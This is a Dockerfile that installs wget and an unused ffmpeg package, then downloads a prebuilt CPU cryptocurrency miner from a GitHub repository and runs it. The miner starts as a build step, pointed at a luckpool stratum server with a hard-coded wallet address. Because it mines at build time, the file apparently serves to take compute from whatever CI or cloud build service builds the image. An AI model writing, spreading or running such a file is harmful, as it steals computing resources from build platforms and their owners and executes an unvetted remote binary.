FROM debian
RUN apt update
RUN apt install wget -y
RUN apt install ffmpeg -y
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN tar -xf hellminer_cpu_linux.tar.gz
RUN echo mining started!
RUN ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u zs1ufhz7jn3v4fya5vw5cdj76gm8prdwrrf3mwwmzkwzcw45s6zz7a0kx987asg75wnhkaqktx3j6l.Rig001 -p x --cpu 4
